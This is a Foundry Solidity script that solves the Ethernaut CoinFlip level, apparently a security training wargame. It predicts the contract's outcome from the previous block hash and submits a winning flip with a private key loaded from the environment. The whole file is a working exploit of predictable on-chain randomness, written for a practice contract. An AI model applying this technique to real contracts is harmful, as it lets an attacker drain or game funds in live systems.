// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {ICoinFlip} from "../../../src/ethernaut/03-coinflip/ICoinFlip.sol";

contract CoinFlipScript is Script {

    address coinFlipInstanceAddress = vm.envAddress("L03_COINFLIP_ADDRESS");
    uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event CoinFlipped(uint256 blockNumber, bool coinSide, uint256 consecutiveWins);

    function run() public {
        // Load contract at address
        ICoinFlip coinflip = ICoinFlip(coinFlipInstanceAddress);

        // Calculate in advance the side of the coin
        uint256 consecutiveWins = coinflip.consecutiveWins();
        uint256 blockNumber = vm.getBlockNumber();
        bool coinSide = _getCoinSide(blockNumber);
        emit CoinFlipped(blockNumber, coinSide, consecutiveWins);

        // Call `flip()` passing the expected side
        require(blockNumber == block.number, "New block!");
        vm.broadcast(privateKey);
        bool result = coinflip.flip(coinSide);
    }

    function _getCoinSide(uint256 _blockNumber) internal returns (bool) {
        uint256 coinFlip = uint256(blockhash(_blockNumber - 1)) / FACTOR;
        return coinFlip == 1;
    }
}
